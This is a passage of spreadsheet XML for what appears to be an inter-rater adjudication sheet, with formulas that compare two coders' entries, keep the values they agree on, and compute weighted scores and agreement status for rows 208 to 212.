        <f>IF(AND(Coder1!X208&amp;""&lt;&gt;"",Coder1!X208&amp;""=Coder2!X208&amp;""),Coder1!X208,"")</f>
        <v/>
      </c>
      <c r="Y208" s="14">
        <f>IF(AND(Coder1!Y208&amp;""&lt;&gt;"",Coder1!Y208&amp;""=Coder2!Y208&amp;""),Coder1!Y208,"")</f>
        <v/>
      </c>
      <c r="Z208" s="14">
        <f>IF(AND(Coder1!Z208&amp;""&lt;&gt;"",Coder1!Z208&amp;""=Coder2!Z208&amp;""),Coder1!Z208,"")</f>
        <v/>
      </c>
      <c r="AA208" s="14">
        <f>IF(AND(Coder1!AA208&amp;""&lt;&gt;"",Coder1!AA208&amp;""=Coder2!AA208&amp;""),Coder1!AA208,"")</f>
        <v/>
      </c>
      <c r="AB208" s="14">
        <f>IF(AND(Coder1!AB208&amp;""&lt;&gt;"",Coder1!AB208&amp;""=Coder2!AB208&amp;""),Coder1!AB208,"")</f>
        <v/>
      </c>
      <c r="AC208" s="14">
        <f>IF(AND(Coder1!AC208&amp;""&lt;&gt;"",Coder1!AC208&amp;""=Coder2!AC208&amp;""),Coder1!AC208,"")</f>
        <v/>
      </c>
      <c r="AD208" s="14">
        <f>IF(AND(Coder1!AD208&amp;""&lt;&gt;"",Coder1!AD208&amp;""=Coder2!AD208&amp;""),Coder1!AD208,"")</f>
        <v/>
      </c>
      <c r="AE208" s="14">
        <f>IF(AND(Coder1!AE208&amp;""&lt;&gt;"",Coder1!AE208&amp;""=Coder2!AE208&amp;""),Coder1!AE208,"")</f>
        <v/>
      </c>
      <c r="AF208" s="14">
        <f>IF(AND(Coder1!AF208&amp;""&lt;&gt;"",Coder1!AF208&amp;""=Coder2!AF208&amp;""),Coder1!AF208,"")</f>
        <v/>
      </c>
      <c r="AG208" s="14">
        <f>IF(AND(Coder1!AG208&amp;""&lt;&gt;"",Coder1!AG208&amp;""=Coder2!AG208&amp;""),Coder1!AG208,"")</f>
        <v/>
      </c>
      <c r="AH208" s="14">
        <f>IF(AND(Coder1!AH208&amp;""&lt;&gt;"",Coder1!AH208&amp;""=Coder2!AH208&amp;""),Coder1!AH208,"")</f>
        <v/>
      </c>
      <c r="AI208" s="11">
        <f>IF(COUNT(E208:L208)=0,"",SUM(E208:L208))</f>
        <v/>
      </c>
      <c r="AJ208" s="11">
        <f>IF(AI208="","",N(E208)*3+N(F208)*2+N(G208)*2+N(H208)*2+N(I208)*2+N(J208)*3+N(K208)*3+N(L208)*3)</f>
        <v/>
      </c>
      <c r="AK208" s="11">
        <f>IF(AI208="","",COUNTIF(N208:AG208,1))</f>
        <v/>
      </c>
      <c r="AL208" s="11">
        <f>IF(OR(AJ208="",AJ208=0),"",ROUND(100*(AJ208-AK208)/AJ208,1))</f>
        <v/>
      </c>
      <c r="AM208" s="11">
        <f>IF(AND(Coder1!AN208=1,Coder2!AN208=1),IF(COUNTBLANK(E208:AH208)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN208" s="11">
        <f>IF(AND(Coder1!AN208=1,Coder2!AN208=1),IF(SUMPRODUCT(--(Coder1!E208:AH208&amp;""&lt;&gt;Coder2!E208:AH208&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO208" s="11" t="n"/>
    </row>
    <row r="209">
      <c r="A209" s="11">
        <f>Coder1!A209</f>
        <v/>
      </c>
      <c r="B209" s="11">
        <f>Coder1!B209</f>
        <v/>
      </c>
      <c r="C209" s="11">
        <f>Coder1!C209</f>
        <v/>
      </c>
      <c r="D209" s="11">
        <f>Coder1!D209</f>
        <v/>
      </c>
      <c r="E209" s="14">
        <f>IF(AND(Coder1!E209&amp;""&lt;&gt;"",Coder1!E209&amp;""=Coder2!E209&amp;""),Coder1!E209,"")</f>
        <v/>
      </c>
      <c r="F209" s="14">
        <f>IF(AND(Coder1!F209&amp;""&lt;&gt;"",Coder1!F209&amp;""=Coder2!F209&amp;""),Coder1!F209,"")</f>
        <v/>
      </c>
      <c r="G209" s="14">
        <f>IF(AND(Coder1!G209&amp;""&lt;&gt;"",Coder1!G209&amp;""=Coder2!G209&amp;""),Coder1!G209,"")</f>
        <v/>
      </c>
      <c r="H209" s="14">
        <f>IF(AND(Coder1!H209&amp;""&lt;&gt;"",Coder1!H209&amp;""=Coder2!H209&amp;""),Coder1!H209,"")</f>
        <v/>
      </c>
      <c r="I209" s="14">
        <f>IF(AND(Coder1!I209&amp;""&lt;&gt;"",Coder1!I209&amp;""=Coder2!I209&amp;""),Coder1!I209,"")</f>
        <v/>
      </c>
      <c r="J209" s="14">
        <f>IF(AND(Coder1!J209&amp;""&lt;&gt;"",Coder1!J209&amp;""=Coder2!J209&amp;""),Coder1!J209,"")</f>
        <v/>
      </c>
      <c r="K209" s="14">
        <f>IF(AND(Coder1!K209&amp;""&lt;&gt;"",Coder1!K209&amp;""=Coder2!K209&amp;""),Coder1!K209,"")</f>
        <v/>
      </c>
      <c r="L209" s="14">
        <f>IF(AND(Coder1!L209&amp;""&lt;&gt;"",Coder1!L209&amp;""=Coder2!L209&amp;""),Coder1!L209,"")</f>
        <v/>
      </c>
      <c r="M209" s="14">
        <f>IF(AND(Coder1!M209&amp;""&lt;&gt;"",Coder1!M209&amp;""=Coder2!M209&amp;""),Coder1!M209,"")</f>
        <v/>
      </c>
      <c r="N209" s="14">
        <f>IF(AND(Coder1!N209&amp;""&lt;&gt;"",Coder1!N209&amp;""=Coder2!N209&amp;""),Coder1!N209,"")</f>
        <v/>
      </c>
      <c r="O209" s="14">
        <f>IF(AND(Coder1!O209&amp;""&lt;&gt;"",Coder1!O209&amp;""=Coder2!O209&amp;""),Coder1!O209,"")</f>
        <v/>
      </c>
      <c r="P209" s="14">
        <f>IF(AND(Coder1!P209&amp;""&lt;&gt;"",Coder1!P209&amp;""=Coder2!P209&amp;""),Coder1!P209,"")</f>
        <v/>
      </c>
      <c r="Q209" s="14">
        <f>IF(AND(Coder1!Q209&amp;""&lt;&gt;"",Coder1!Q209&amp;""=Coder2!Q209&amp;""),Coder1!Q209,"")</f>
        <v/>
      </c>
      <c r="R209" s="14">
        <f>IF(AND(Coder1!R209&amp;""&lt;&gt;"",Coder1!R209&amp;""=Coder2!R209&amp;""),Coder1!R209,"")</f>
        <v/>
      </c>
      <c r="S209" s="14">
        <f>IF(AND(Coder1!S209&amp;""&lt;&gt;"",Coder1!S209&amp;""=Coder2!S209&amp;""),Coder1!S209,"")</f>
        <v/>
      </c>
      <c r="T209" s="14">
        <f>IF(AND(Coder1!T209&amp;""&lt;&gt;"",Coder1!T209&amp;""=Coder2!T209&amp;""),Coder1!T209,"")</f>
        <v/>
      </c>
      <c r="U209" s="14">
        <f>IF(AND(Coder1!U209&amp;""&lt;&gt;"",Coder1!U209&amp;""=Coder2!U209&amp;""),Coder1!U209,"")</f>
        <v/>
      </c>
      <c r="V209" s="14">
        <f>IF(AND(Coder1!V209&amp;""&lt;&gt;"",Coder1!V209&amp;""=Coder2!V209&amp;""),Coder1!V209,"")</f>
        <v/>
      </c>
      <c r="W209" s="14">
        <f>IF(AND(Coder1!W209&amp;""&lt;&gt;"",Coder1!W209&amp;""=Coder2!W209&amp;""),Coder1!W209,"")</f>
        <v/>
      </c>
      <c r="X209" s="14">
        <f>IF(AND(Coder1!X209&amp;""&lt;&gt;"",Coder1!X209&amp;""=Coder2!X209&amp;""),Coder1!X209,"")</f>
        <v/>
      </c>
      <c r="Y209" s="14">
        <f>IF(AND(Coder1!Y209&amp;""&lt;&gt;"",Coder1!Y209&amp;""=Coder2!Y209&amp;""),Coder1!Y209,"")</f>
        <v/>
      </c>
      <c r="Z209" s="14">
        <f>IF(AND(Coder1!Z209&amp;""&lt;&gt;"",Coder1!Z209&amp;""=Coder2!Z209&amp;""),Coder1!Z209,"")</f>
        <v/>
      </c>
      <c r="AA209" s="14">
        <f>IF(AND(Coder1!AA209&amp;""&lt;&gt;"",Coder1!AA209&amp;""=Coder2!AA209&amp;""),Coder1!AA209,"")</f>
        <v/>
      </c>
      <c r="AB209" s="14">
        <f>IF(AND(Coder1!AB209&amp;""&lt;&gt;"",Coder1!AB209&amp;""=Coder2!AB209&amp;""),Coder1!AB209,"")</f>
        <v/>
      </c>
      <c r="AC209" s="14">
        <f>IF(AND(Coder1!AC209&amp;""&lt;&gt;"",Coder1!AC209&amp;""=Coder2!AC209&amp;""),Coder1!AC209,"")</f>
        <v/>
      </c>
      <c r="AD209" s="14">
        <f>IF(AND(Coder1!AD209&amp;""&lt;&gt;"",Coder1!AD209&amp;""=Coder2!AD209&amp;""),Coder1!AD209,"")</f>
        <v/>
      </c>
      <c r="AE209" s="14">
        <f>IF(AND(Coder1!AE209&amp;""&lt;&gt;"",Coder1!AE209&amp;""=Coder2!AE209&amp;""),Coder1!AE209,"")</f>
        <v/>
      </c>
      <c r="AF209" s="14">
        <f>IF(AND(Coder1!AF209&amp;""&lt;&gt;"",Coder1!AF209&amp;""=Coder2!AF209&amp;""),Coder1!AF209,"")</f>
        <v/>
      </c>
      <c r="AG209" s="14">
        <f>IF(AND(Coder1!AG209&amp;""&lt;&gt;"",Coder1!AG209&amp;""=Coder2!AG209&amp;""),Coder1!AG209,"")</f>
        <v/>
      </c>
      <c r="AH209" s="14">
        <f>IF(AND(Coder1!AH209&amp;""&lt;&gt;"",Coder1!AH209&amp;""=Coder2!AH209&amp;""),Coder1!AH209,"")</f>
        <v/>
      </c>
      <c r="AI209" s="11">
        <f>IF(COUNT(E209:L209)=0,"",SUM(E209:L209))</f>
        <v/>
      </c>
      <c r="AJ209" s="11">
        <f>IF(AI209="","",N(E209)*3+N(F209)*2+N(G209)*2+N(H209)*2+N(I209)*2+N(J209)*3+N(K209)*3+N(L209)*3)</f>
        <v/>
      </c>
      <c r="AK209" s="11">
        <f>IF(AI209="","",COUNTIF(N209:AG209,1))</f>
        <v/>
      </c>
      <c r="AL209" s="11">
        <f>IF(OR(AJ209="",AJ209=0),"",ROUND(100*(AJ209-AK209)/AJ209,1))</f>
        <v/>
      </c>
      <c r="AM209" s="11">
        <f>IF(AND(Coder1!AN209=1,Coder2!AN209=1),IF(COUNTBLANK(E209:AH209)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN209" s="11">
        <f>IF(AND(Coder1!AN209=1,Coder2!AN209=1),IF(SUMPRODUCT(--(Coder1!E209:AH209&amp;""&lt;&gt;Coder2!E209:AH209&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO209" s="11" t="n"/>
    </row>
    <row r="210">
      <c r="A210" s="11">
        <f>Coder1!A210</f>
        <v/>
      </c>
      <c r="B210" s="11">
        <f>Coder1!B210</f>
        <v/>
      </c>
      <c r="C210" s="11">
        <f>Coder1!C210</f>
        <v/>
      </c>
      <c r="D210" s="11">
        <f>Coder1!D210</f>
        <v/>
      </c>
      <c r="E210" s="14">
        <f>IF(AND(Coder1!E210&amp;""&lt;&gt;"",Coder1!E210&amp;""=Coder2!E210&amp;""),Coder1!E210,"")</f>
        <v/>
      </c>
      <c r="F210" s="14">
        <f>IF(AND(Coder1!F210&amp;""&lt;&gt;"",Coder1!F210&amp;""=Coder2!F210&amp;""),Coder1!F210,"")</f>
        <v/>
      </c>
      <c r="G210" s="14">
        <f>IF(AND(Coder1!G210&amp;""&lt;&gt;"",Coder1!G210&amp;""=Coder2!G210&amp;""),Coder1!G210,"")</f>
        <v/>
      </c>
      <c r="H210" s="14">
        <f>IF(AND(Coder1!H210&amp;""&lt;&gt;"",Coder1!H210&amp;""=Coder2!H210&amp;""),Coder1!H210,"")</f>
        <v/>
      </c>
      <c r="I210" s="14">
        <f>IF(AND(Coder1!I210&amp;""&lt;&gt;"",Coder1!I210&amp;""=Coder2!I210&amp;""),Coder1!I210,"")</f>
        <v/>
      </c>
      <c r="J210" s="14">
        <f>IF(AND(Coder1!J210&amp;""&lt;&gt;"",Coder1!J210&amp;""=Coder2!J210&amp;""),Coder1!J210,"")</f>
        <v/>
      </c>
      <c r="K210" s="14">
        <f>IF(AND(Coder1!K210&amp;""&lt;&gt;"",Coder1!K210&amp;""=Coder2!K210&amp;""),Coder1!K210,"")</f>
        <v/>
      </c>
      <c r="L210" s="14">
        <f>IF(AND(Coder1!L210&amp;""&lt;&gt;"",Coder1!L210&amp;""=Coder2!L210&amp;""),Coder1!L210,"")</f>
        <v/>
      </c>
      <c r="M210" s="14">
        <f>IF(AND(Coder1!M210&amp;""&lt;&gt;"",Coder1!M210&amp;""=Coder2!M210&amp;""),Coder1!M210,"")</f>
        <v/>
      </c>
      <c r="N210" s="14">
        <f>IF(AND(Coder1!N210&amp;""&lt;&gt;"",Coder1!N210&amp;""=Coder2!N210&amp;""),Coder1!N210,"")</f>
        <v/>
      </c>
      <c r="O210" s="14">
        <f>IF(AND(Coder1!O210&amp;""&lt;&gt;"",Coder1!O210&amp;""=Coder2!O210&amp;""),Coder1!O210,"")</f>
        <v/>
      </c>
      <c r="P210" s="14">
        <f>IF(AND(Coder1!P210&amp;""&lt;&gt;"",Coder1!P210&amp;""=Coder2!P210&amp;""),Coder1!P210,"")</f>
        <v/>
      </c>
      <c r="Q210" s="14">
        <f>IF(AND(Coder1!Q210&amp;""&lt;&gt;"",Coder1!Q210&amp;""=Coder2!Q210&amp;""),Coder1!Q210,"")</f>
        <v/>
      </c>
      <c r="R210" s="14">
        <f>IF(AND(Coder1!R210&amp;""&lt;&gt;"",Coder1!R210&amp;""=Coder2!R210&amp;""),Coder1!R210,"")</f>
        <v/>
      </c>
      <c r="S210" s="14">
        <f>IF(AND(Coder1!S210&amp;""&lt;&gt;"",Coder1!S210&amp;""=Coder2!S210&amp;""),Coder1!S210,"")</f>
        <v/>
      </c>
      <c r="T210" s="14">
        <f>IF(AND(Coder1!T210&amp;""&lt;&gt;"",Coder1!T210&amp;""=Coder2!T210&amp;""),Coder1!T210,"")</f>
        <v/>
      </c>
      <c r="U210" s="14">
        <f>IF(AND(Coder1!U210&amp;""&lt;&gt;"",Coder1!U210&amp;""=Coder2!U210&amp;""),Coder1!U210,"")</f>
        <v/>
      </c>
      <c r="V210" s="14">
        <f>IF(AND(Coder1!V210&amp;""&lt;&gt;"",Coder1!V210&amp;""=Coder2!V210&amp;""),Coder1!V210,"")</f>
        <v/>
      </c>
      <c r="W210" s="14">
        <f>IF(AND(Coder1!W210&amp;""&lt;&gt;"",Coder1!W210&amp;""=Coder2!W210&amp;""),Coder1!W210,"")</f>
        <v/>
      </c>
      <c r="X210" s="14">
        <f>IF(AND(Coder1!X210&amp;""&lt;&gt;"",Coder1!X210&amp;""=Coder2!X210&amp;""),Coder1!X210,"")</f>
        <v/>
      </c>
      <c r="Y210" s="14">
        <f>IF(AND(Coder1!Y210&amp;""&lt;&gt;"",Coder1!Y210&amp;""=Coder2!Y210&amp;""),Coder1!Y210,"")</f>
        <v/>
      </c>
      <c r="Z210" s="14">
        <f>IF(AND(Coder1!Z210&amp;""&lt;&gt;"",Coder1!Z210&amp;""=Coder2!Z210&amp;""),Coder1!Z210,"")</f>
        <v/>
      </c>
      <c r="AA210" s="14">
        <f>IF(AND(Coder1!AA210&amp;""&lt;&gt;"",Coder1!AA210&amp;""=Coder2!AA210&amp;""),Coder1!AA210,"")</f>
        <v/>
      </c>
      <c r="AB210" s="14">
        <f>IF(AND(Coder1!AB210&amp;""&lt;&gt;"",Coder1!AB210&amp;""=Coder2!AB210&amp;""),Coder1!AB210,"")</f>
        <v/>
      </c>
      <c r="AC210" s="14">
        <f>IF(AND(Coder1!AC210&amp;""&lt;&gt;"",Coder1!AC210&amp;""=Coder2!AC210&amp;""),Coder1!AC210,"")</f>
        <v/>
      </c>
      <c r="AD210" s="14">
        <f>IF(AND(Coder1!AD210&amp;""&lt;&gt;"",Coder1!AD210&amp;""=Coder2!AD210&amp;""),Coder1!AD210,"")</f>
        <v/>
      </c>
      <c r="AE210" s="14">
        <f>IF(AND(Coder1!AE210&amp;""&lt;&gt;"",Coder1!AE210&amp;""=Coder2!AE210&amp;""),Coder1!AE210,"")</f>
        <v/>
      </c>
      <c r="AF210" s="14">
        <f>IF(AND(Coder1!AF210&amp;""&lt;&gt;"",Coder1!AF210&amp;""=Coder2!AF210&amp;""),Coder1!AF210,"")</f>
        <v/>
      </c>
      <c r="AG210" s="14">
        <f>IF(AND(Coder1!AG210&amp;""&lt;&gt;"",Coder1!AG210&amp;""=Coder2!AG210&amp;""),Coder1!AG210,"")</f>
        <v/>
      </c>
      <c r="AH210" s="14">
        <f>IF(AND(Coder1!AH210&amp;""&lt;&gt;"",Coder1!AH210&amp;""=Coder2!AH210&amp;""),Coder1!AH210,"")</f>
        <v/>
      </c>
      <c r="AI210" s="11">
        <f>IF(COUNT(E210:L210)=0,"",SUM(E210:L210))</f>
        <v/>
      </c>
      <c r="AJ210" s="11">
        <f>IF(AI210="","",N(E210)*3+N(F210)*2+N(G210)*2+N(H210)*2+N(I210)*2+N(J210)*3+N(K210)*3+N(L210)*3)</f>
        <v/>
      </c>
      <c r="AK210" s="11">
        <f>IF(AI210="","",COUNTIF(N210:AG210,1))</f>
        <v/>
      </c>
      <c r="AL210" s="11">
        <f>IF(OR(AJ210="",AJ210=0),"",ROUND(100*(AJ210-AK210)/AJ210,1))</f>
        <v/>
      </c>
      <c r="AM210" s="11">
        <f>IF(AND(Coder1!AN210=1,Coder2!AN210=1),IF(COUNTBLANK(E210:AH210)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN210" s="11">
        <f>IF(AND(Coder1!AN210=1,Coder2!AN210=1),IF(SUMPRODUCT(--(Coder1!E210:AH210&amp;""&lt;&gt;Coder2!E210:AH210&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO210" s="11" t="n"/>
    </row>
    <row r="211">
      <c r="A211" s="11">
        <f>Coder1!A211</f>
        <v/>
      </c>
      <c r="B211" s="11">
        <f>Coder1!B211</f>
        <v/>
      </c>
      <c r="C211" s="11">
        <f>Coder1!C211</f>
        <v/>
      </c>
      <c r="D211" s="11">
        <f>Coder1!D211</f>
        <v/>
      </c>
      <c r="E211" s="14">
        <f>IF(AND(Coder1!E211&amp;""&lt;&gt;"",Coder1!E211&amp;""=Coder2!E211&amp;""),Coder1!E211,"")</f>
        <v/>
      </c>
      <c r="F211" s="14">
        <f>IF(AND(Coder1!F211&amp;""&lt;&gt;"",Coder1!F211&amp;""=Coder2!F211&amp;""),Coder1!F211,"")</f>
        <v/>
      </c>
      <c r="G211" s="14">
        <f>IF(AND(Coder1!G211&amp;""&lt;&gt;"",Coder1!G211&amp;""=Coder2!G211&amp;""),Coder1!G211,"")</f>
        <v/>
      </c>
      <c r="H211" s="14">
        <f>IF(AND(Coder1!H211&amp;""&lt;&gt;"",Coder1!H211&amp;""=Coder2!H211&amp;""),Coder1!H211,"")</f>
        <v/>
      </c>
      <c r="I211" s="14">
        <f>IF(AND(Coder1!I211&amp;""&lt;&gt;"",Coder1!I211&amp;""=Coder2!I211&amp;""),Coder1!I211,"")</f>
        <v/>
      </c>
      <c r="J211" s="14">
        <f>IF(AND(Coder1!J211&amp;""&lt;&gt;"",Coder1!J211&amp;""=Coder2!J211&amp;""),Coder1!J211,"")</f>
        <v/>
      </c>
      <c r="K211" s="14">
        <f>IF(AND(Coder1!K211&amp;""&lt;&gt;"",Coder1!K211&amp;""=Coder2!K211&amp;""),Coder1!K211,"")</f>
        <v/>
      </c>
      <c r="L211" s="14">
        <f>IF(AND(Coder1!L211&amp;""&lt;&gt;"",Coder1!L211&amp;""=Coder2!L211&amp;""),Coder1!L211,"")</f>
        <v/>
      </c>
      <c r="M211" s="14">
        <f>IF(AND(Coder1!M211&amp;""&lt;&gt;"",Coder1!M211&amp;""=Coder2!M211&amp;""),Coder1!M211,"")</f>
        <v/>
      </c>
      <c r="N211" s="14">
        <f>IF(AND(Coder1!N211&amp;""&lt;&gt;"",Coder1!N211&amp;""=Coder2!N211&amp;""),Coder1!N211,"")</f>
        <v/>
      </c>
      <c r="O211" s="14">
        <f>IF(AND(Coder1!O211&amp;""&lt;&gt;"",Coder1!O211&amp;""=Coder2!O211&amp;""),Coder1!O211,"")</f>
        <v/>
      </c>
      <c r="P211" s="14">
        <f>IF(AND(Coder1!P211&amp;""&lt;&gt;"",Coder1!P211&amp;""=Coder2!P211&amp;""),Coder1!P211,"")</f>
        <v/>
      </c>
      <c r="Q211" s="14">
        <f>IF(AND(Coder1!Q211&amp;""&lt;&gt;"",Coder1!Q211&amp;""=Coder2!Q211&amp;""),Coder1!Q211,"")</f>
        <v/>
      </c>
      <c r="R211" s="14">
        <f>IF(AND(Coder1!R211&amp;""&lt;&gt;"",Coder1!R211&amp;""=Coder2!R211&amp;""),Coder1!R211,"")</f>
        <v/>
      </c>
      <c r="S211" s="14">
        <f>IF(AND(Coder1!S211&amp;""&lt;&gt;"",Coder1!S211&amp;""=Coder2!S211&amp;""),Coder1!S211,"")</f>
        <v/>
      </c>
      <c r="T211" s="14">
        <f>IF(AND(Coder1!T211&amp;""&lt;&gt;"",Coder1!T211&amp;""=Coder2!T211&amp;""),Coder1!T211,"")</f>
        <v/>
      </c>
      <c r="U211" s="14">
        <f>IF(AND(Coder1!U211&amp;""&lt;&gt;"",Coder1!U211&amp;""=Coder2!U211&amp;""),Coder1!U211,"")</f>
        <v/>
      </c>
      <c r="V211" s="14">
        <f>IF(AND(Coder1!V211&amp;""&lt;&gt;"",Coder1!V211&amp;""=Coder2!V211&amp;""),Coder1!V211,"")</f>
        <v/>
      </c>
      <c r="W211" s="14">
        <f>IF(AND(Coder1!W211&amp;""&lt;&gt;"",Coder1!W211&amp;""=Coder2!W211&amp;""),Coder1!W211,"")</f>
        <v/>
      </c>
      <c r="X211" s="14">
        <f>IF(AND(Coder1!X211&amp;""&lt;&gt;"",Coder1!X211&amp;""=Coder2!X211&amp;""),Coder1!X211,"")</f>
        <v/>
      </c>
      <c r="Y211" s="14">
        <f>IF(AND(Coder1!Y211&amp;""&lt;&gt;"",Coder1!Y211&amp;""=Coder2!Y211&amp;""),Coder1!Y211,"")</f>
        <v/>
      </c>
      <c r="Z211" s="14">
        <f>IF(AND(Coder1!Z211&amp;""&lt;&gt;"",Coder1!Z211&amp;""=Coder2!Z211&amp;""),Coder1!Z211,"")</f>
        <v/>
      </c>
      <c r="AA211" s="14">
        <f>IF(AND(Coder1!AA211&amp;""&lt;&gt;"",Coder1!AA211&amp;""=Coder2!AA211&amp;""),Coder1!AA211,"")</f>
        <v/>
      </c>
      <c r="AB211" s="14">
        <f>IF(AND(Coder1!AB211&amp;""&lt;&gt;"",Coder1!AB211&amp;""=Coder2!AB211&amp;""),Coder1!AB211,"")</f>
        <v/>
      </c>
      <c r="AC211" s="14">
        <f>IF(AND(Coder1!AC211&amp;""&lt;&gt;"",Coder1!AC211&amp;""=Coder2!AC211&amp;""),Coder1!AC211,"")</f>
        <v/>
      </c>
      <c r="AD211" s="14">
        <f>IF(AND(Coder1!AD211&amp;""&lt;&gt;"",Coder1!AD211&amp;""=Coder2!AD211&amp;""),Coder1!AD211,"")</f>
        <v/>
      </c>
      <c r="AE211" s="14">
        <f>IF(AND(Coder1!AE211&amp;""&lt;&gt;"",Coder1!AE211&amp;""=Coder2!AE211&amp;""),Coder1!AE211,"")</f>
        <v/>
      </c>
      <c r="AF211" s="14">
        <f>IF(AND(Coder1!AF211&amp;""&lt;&gt;"",Coder1!AF211&amp;""=Coder2!AF211&amp;""),Coder1!AF211,"")</f>
        <v/>
      </c>
      <c r="AG211" s="14">
        <f>IF(AND(Coder1!AG211&amp;""&lt;&gt;"",Coder1!AG211&amp;""=Coder2!AG211&amp;""),Coder1!AG211,"")</f>
        <v/>
      </c>
      <c r="AH211" s="14">
        <f>IF(AND(Coder1!AH211&amp;""&lt;&gt;"",Coder1!AH211&amp;""=Coder2!AH211&amp;""),Coder1!AH211,"")</f>
        <v/>
      </c>
      <c r="AI211" s="11">
        <f>IF(COUNT(E211:L211)=0,"",SUM(E211:L211))</f>
        <v/>
      </c>
      <c r="AJ211" s="11">
        <f>IF(AI211="","",N(E211)*3+N(F211)*2+N(G211)*2+N(H211)*2+N(I211)*2+N(J211)*3+N(K211)*3+N(L211)*3)</f>
        <v/>
      </c>
      <c r="AK211" s="11">
        <f>IF(AI211="","",COUNTIF(N211:AG211,1))</f>
        <v/>
      </c>
      <c r="AL211" s="11">
        <f>IF(OR(AJ211="",AJ211=0),"",ROUND(100*(AJ211-AK211)/AJ211,1))</f>
        <v/>
      </c>
      <c r="AM211" s="11">
        <f>IF(AND(Coder1!AN211=1,Coder2!AN211=1),IF(COUNTBLANK(E211:AH211)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN211" s="11">
        <f>IF(AND(Coder1!AN211=1,Coder2!AN211=1),IF(SUMPRODUCT(--(Coder1!E211:AH211&amp;""&lt;&gt;Coder2!E211:AH211&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO211" s="11" t="n"/>
    </row>
    <row r="212">
      <c r="A212" s="11">
        <f>Coder1!A212</f>
        <v/>
      </c>
      <c r="B212" s="11">
        <f>Coder1!B212</f>
        <v/>
      </c>
      <c r="C212" s="11">
        <f>Coder1!C212</f>
        <v/>
      </c>
      <c r="D212" s="11">
        <f>Coder1!D212</f>
        <v/>
      </c>
      <c r="E212" s="14">
        <f>IF(AND(Coder1!E212&amp;""&lt;&gt;"",Coder1!E212&amp;""=Coder2!E212&amp;""),Coder1!E212,"")</f>
        <v/>
      </c>
      <c r="F212" s="14">
        <f>IF(AND(Coder1!F212&amp;""&lt;&gt;"",Coder1!F212&amp;""=Coder2!F212&amp;""),Coder1!F212,"")</f>
        <v/>
      </c>
      <c r="G212" s="14">
        <f>IF(AND(Coder1!G212&amp;""&lt;&gt;"",Coder1!G212&amp;""=Coder2!G212&amp;""),Coder1!G212,"")</f>
        <v/>
      </c>
      <c r="H212" s="14">
        <f>IF(AND(Coder1!H212&amp;""&lt;&gt;"",Coder1!H212&amp;""=Coder2!H212&amp;""),Coder1!H212,"")</f>
        <v/>
      </c>
      <c r="I212" s="14">
        <f>IF(AND(Coder1!I212&amp;""&lt;&gt;"",Coder1!I212&amp;""=Coder2!I212&amp;""),Coder1!I212,"")</f>
        <v/>
      </c>
      <c r="J212" s="14">
        <f>IF(AND(Coder1!J212&amp;""&lt;&gt;"",Coder1!J212&amp;""=Coder2!J212&amp;""),Coder1!J212,"")</f>
        <v/>
      </c>
      <c r="K212" s="14">
        <f>IF(AND(Coder1!K212&amp;""&lt;&gt;"",Coder1!K212&amp;""=Coder2!K212&amp;""),Coder1!K212,"")</f>
        <v/>
      </c>
      <c r="L212" s="14">
        <f>IF(AND(Coder1!L212&amp;""&lt;&gt;"",Coder1!L212&amp;""=Coder2!L212&amp;""),Coder1!L212,"")</f>
        <v/>
      </c>
      <c r="M212" s="14">
        <f>IF(AND(Coder1!M212&amp;""&lt;&gt;"",Coder1!M212&amp;""=Coder2!M212&amp;""),Coder1!M212,"")</f>
        <v/>
      </c>
      <c r="N212" s="14">
        <f>IF(AND(Coder1!N212&amp;""&lt;&gt;"",Coder1!N212&amp;""=Coder2!N212&amp;""),Coder1!N212,"")</f>
        <v/>
      </c>
      <c r="O212" s="14">
        <f>IF(AND(Coder1!O212&amp;""&lt;&gt;"",Coder1!O212&amp;""=Coder2!O212&amp;""),Coder1!O212,"")</f>
        <v/>
      </c>
      <c r="P212" s="14">
        <f>IF(AND(Coder1!P212&amp;""&lt;&gt;"",Coder1!P212&amp;""=Coder2!P212&amp;""),Coder1!P212,"")</f>
        <v/>
      </c>
      <c r="Q212" s="14">
        <f>IF(AND(Coder1!Q212&amp;""&lt;&gt;"",Coder1!Q212&amp;""=Coder2!Q212&amp;""),Coder1!Q212,"")</f>
        <v/>
      </c>
      <c r="R212" s="14">
        <f>IF(AND(Coder1!R212&amp;""&lt;&gt;"",Coder1!R212&amp;""=Coder2!R212&amp;""),Coder1!R212,"")</f>
        <v/>
      </c>
      <c r="S212" s="14">
        <f>IF(AND(Coder1!S212&amp;""&lt;&gt;"",Coder1!S212&amp;""=Coder2!S212&amp;""),Coder1!S212,"")</f>
        <v/>
      </c>
      <c r="T212" s="14">
        <f>IF(AND(Coder1!T212&amp;""&lt;&gt;"",Coder1!T212&amp;""=Coder2!T212&amp;""),Coder1!T212,"")</f>
        <v/>
      </c>
      <c r="U212" s="14">
        <f>IF(AND(Coder1!U212&amp;""&lt;&gt;"",Coder1!U212&amp;""=Coder2!U212&amp;""),Coder1!U212,"")</f>
        <v/>
      </c>
      <c r="V212" s="14">
        <f>IF(AND(Coder1!V212&amp;""&lt;&gt;"",Coder1!V212&amp;""=Coder2!V212&amp;""),Coder1!V212,"")</f>
        <v/>
      </c>
      <c r="W212" s="14">
        <f>IF(AND(Coder1!W212&amp;""&lt;&gt;"",Coder1!W212&amp;""=Coder2!W212&amp;""),Coder1!W212,"")</f>
        <v/>
      </c>
      <c r="X212" s="14">
        <f>IF(AND(Coder1!X212&amp;""&lt;&gt;"",Coder1!X212&amp;""=Coder2!X212&amp;""),Coder1!X212,"")</f>
        <v/>
      </c>
      <c r="Y212" s="14">
        <f>IF(AND(Coder1!Y212&amp;""&lt;&gt;"",Coder1!Y212&amp;""=Coder2!Y212&amp;""),Coder1!Y212,"")</f>
        <v/>
      </c>
      <c r="Z212" s="14">
        <f>IF(AND(Coder1!Z212&amp;""&lt;&gt;"",Coder1!Z212&amp;""=Coder2!Z212&amp;""),Coder1!Z212,"")</f>
        <v/>
      </c>
      <c r="AA212" s="14">
